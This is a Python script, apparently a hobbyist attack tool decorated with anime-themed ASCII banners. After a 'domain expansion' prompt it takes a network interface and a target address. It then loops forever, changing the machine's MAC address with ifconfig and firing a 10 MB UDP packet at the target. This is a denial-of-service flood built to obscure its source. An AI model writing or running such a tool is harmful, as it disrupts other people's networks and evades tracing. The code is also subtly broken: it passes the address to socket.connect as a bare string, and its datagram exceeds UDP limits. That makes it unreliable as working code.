from socket import *
import subprocess
import re
import random
import time
import os

#send the payload
def DoS(address):
    s = socket(family=AF_INET, type=SOCK_DGRAM)
    s.connect(address)
    packet = payload()
    s.send(packet)
    s.close()

#create a big payload
def payload():
    payloadSize = 10*1024*1024
    data = b'0' * payloadSize
    return data

def checkMac(interface):
    output = subprocess.check_output(["ifconfig", interface]).decode('utf-8')
    macS = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", output)
    if macS:
        return macS.group(0)
    else:
        print("[-] Could not read MAC address.")
        return None

def changingMac(interface, new_mac):
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", interface, "up"])

def generateMac():
    hex_digits = "0123456789abcdef"
    mac = [
        random.choice(hex_digits) + random.choice("02468ace"),
        "".join(random.sample(hex_digits, 2)),
        "".join(random.sample(hex_digits, 2)),
        "".join(random.sample(hex_digits, 2)),
        "".join(random.sample(hex_digits, 2)),
        "".join(random.sample(hex_digits, 2))
    ]
    return ":".join(mac)


def domain_expansion():
    print("""
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::.%::@.::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::#:.#-%:::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::*::%::=:#:::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::@:.::.*:*:::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::%:#.::*:.:::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::.:-=::%:::::*:::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::+:::::%:::::+:::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::.:::::#::::*+:::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::#:::=**%.:::.%:::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::.::::#:#::::.+:::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::=:::::-:#:::::-:::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::+:::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::.::::::#::-:::::-:::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::=::::::::::::.:.=:::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::.:::::.::.:..::.*:::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::...-.:=+::-.::.::=.::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::.=:::::-::#:::::+::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::-::::::-:%:::::::+::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::..:::::::#:::::::#:::::::=-#=:::::::::::::::::::::::::
::::::::::::::::::::::::--.:::::+:::::::#::::::..::::+:::::::::::::::::::::::
::.:::::::::::::::::::::#:::::::*-::::::+.=*.::::::::%:::::::::::::::::::::::
.:::::::::::::::::::::::::::::::*=:::::+:::::.#::::::::::::::::::::::::::::::
::::::::::::::::::::::::..::::-=:+---.::::::::.:#:::-::::::::::::::::::::::::
:...:::::::::::::::.::::..::::=:+::::::.::::::::::.+#::::::::::::::::::::::::
::.::::::::::::::::::::::.::::::::::::::::*=.::::::::-.::::::::::::::::::::::
::.:::::::::::::::::::::*:::::::::::-:.:#+::*+-#-.::::@::::::::::::::::::::::
:::.:::::::::::::.:::::::-.::::::::..*-#==..++-+=::::::::::::::::::::::::::::
:::::::::::::::::::::::::-:::::::::::.::.::::::::::::..::::::::::::::::::::::
::::::::::::::::::::::::.=::::::::::::::::::::::::::::.::::::::::::::::::::::
:::::::::::::::::::::::::*::::::..:::::::::::::::@:::::::::::::::::::::::::::
:::::::::::::::::::::::::=.:::::::::::+-:.....*%::::::-::::::::::::::::::::::
:::::::::::::::::::.:::::.::::::::::::::#=-+=-===:::::=::::::::::::::::::::::
:::.:::::::::::..::::::::..::+:.::::::::+=-:----*:::::+::::::::::::::::::::::
::::::::::::::::::..:.::...::.:::::::::=-.:::--:-+::::%::::::::::::::::::::::
::::::::::::::::::::..:.::.:.::::::..:..:::::::::::::#:::::::::::::::::::::::
::::::::::::::::::..:...:::::::::..::::::..::::#:::=:::::::::::::::::::::::::
::::::::::::::::::::::::::=::::::::::.::::.::::-.=:#:::::::::::::::::::::::::
::::::::::::::::::::::::::*:...-::::::::::.::::::::%:::::::::::::::::::::::::
:::::::::::::::::::::::::..:=::.:::::::::..::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::.::.:=::.:::::::::-:::::::.:::::::::::::::::::::::::::
:::::::::::::::::::::::...:..::::::::::::::::-:.-::::::::::::::::::::::::::::
:::::::::::::::::::::.:.:..:::::::::::::::::.:.%:::::::::::::::::::::::::::::
:::::::::::::::::::.%##*#..:.::::::::::::::+:=*.:::::::::::::::::::::::::::::
:::::::::::::::::##*#*##+.:::::::::::::::..:++*::::::::::::::::::::::::::::::
:::::::::::::::::+=#****...:::::::::::::-.=-+=%::::::::::::::::::::::::::::::
:::::::::::::::::#+-*#*#..::::::::::::::.--+=#*#*%:::::::::::::::::::::::::::
:::::::::::::::::-----*#.::..::::::::=:::-===###*#*-:::::::::::::::::::::::::
:::::::::::::::::.-:-::=:::---*.:::::::::=--+###*+-#:::::::::::::::::::::::::
::::::::::::::::::+-:::::+::-:=:-:..-::::::--%-=---#:::::::::::::::::::::::::
::::::::::::::::::+-::-::::%:::::::::.::.%=---:---:.:::::::::::::::::::::::::
::..::::::::::::::.-:::::::::%.::::.*=:-::::::----%::::::::::::::::::::::::::
:::.:::::::::::::::=:::::::::::----::-:::::::::-:::::::::::::::::::::::::::::
:::::::::::::::::::=:::::::::::::::::::::::::-:::::::::::::::::::::::::::::::
""")

def initialPrint():
    print("""

###################%###%#@@@@@@@@@@@@@%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%###%#########%#########
%%####***++++%@@@@@@@%*#%###@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@###%##%@@@@@@@%*+++**+*##%%%
#**++++++++#@@@#*++*#%@@+*#####@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@###%#*+@@%#**++#%@@%++++++++**#
#*++++++++*@%*=+***+++#%%%+*#%%##@@@@@@@@@@%@@@%@%%%#%@@@@@@@@@@@@@##@%#*+#%%#+++***+=*%@#++++++++*#
@#++++++++#%#+=+#%%%%+++#%+++#%##@@@@@@@@@@@%%@@#%%%@@@@@@@@@@@#@@@####+++%#+++%%%%#+==#%#+=++++++#@
@@#*+++++++%#+==*###*+++##++++*%%#%@%%%%#@@%@@@%%%@+#@@@@@@@@@@@@%##%*++++#*++*+###*==+*%*+++++++#@@
%%%%*+++++++#+--=-::+-:=*%=+++++*@%@%%%@%%%@@@@@#%%=%%%@@@@@@@@@@%@*+++++=%*=:-*::==--=#*+++++++#%%%
@@@@@#+++++==#*=-+::::++#=+=+++++%#@@@@@@@@@@@@@%#%%#*+%*@=%*@@@@%#*++++++=+*+-:::=--+#+==++++*%@@@@
@@@@@@%*+++++==+######==++=++++*%##%@@@@@@@@%@@@%%%+=@%#@=%*@@@@@##@*++++=+===######+=++++++*%%@@@@@
@@@@@@@@@#++++++++==++++++++%@@%%%@@@%@@@@@@#@@@@#@@@@%*%#=@@@@@@@@@@@@@++++++++==++++++++*%@%%%@@@@
@@@@@@@@@@@@%*++++++++%@@@@#@%@%@@@@@@@@@@@@@@@@%%@@@@%%%%@@@@@@@@@@@@@@@@@@@%*+++++++*%@@@@@@@@@@@@
@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@%@%@@@@@@@@@@@@@@

""")
    
def text():
    print("""
 _____             _ _    _   _______         _         _         
|  __ \           (_) |  (_) |__   __|       | |       (_)        
| |__) |   _  ___  _| | ___     | | ___ _ __ | | ____ _ _         
|  _  / | | |/ _ \| | |/ / |    | |/ _ \ '_ \| |/ / _` | |        
| | \ \ |_| | (_) | |   <| |    | |  __/ | | |   < (_| | |  _ _ _ 
|_|  \_\__, |\___/|_|_|\_\_|    |_|\___|_| |_|_|\_\__,_|_| (_|_|_)
        __/ |                                                     
       |___/                                                      
""")
    time.sleep(1.2)
    print("""
 __  __                        _              _           
|  \/  |                      | |            | |          
| \  / |_   _ _ __ _   _  ___ | | ___   _ ___| |__   ___  
| |\/| | | | | '__| | | |/ _ \| |/ / | | / __| '_ \ / _ \ 
| |  | | |_| | |  | |_| | (_) |   <| |_| \__ \ | | | (_) |
|_|  |_|\__,_|_|   \__, |\___/|_|\_\\__,_|___/_| |_|\___/ 
                    __/ |                                 
                   |___/                                  
""")
    
def main():
    initialPrint()
    while True:
        inputer = str(input("[*]Zero > "))
        if inputer == "domain expansion":
            domain_expansion()
            time.sleep(0.5)
            text()
            inter = str(input("[*]Zero: Input your interface > "))
            address = str(input("[*]Zero: Input target's adress > "))
            try:
                mac = checkMac(inter)
                if mac == None:
                    pass
                else:
                    while True:
                        new_mac = generateMac()
                        changingMac(inter, new_mac)
                        DoS(address)

            except KeyboardInterrupt:
                print("[*] Exiting...")
                exit()
            except Exception:
                print("[*] Error")
                os.system(command= "clear")
                exit()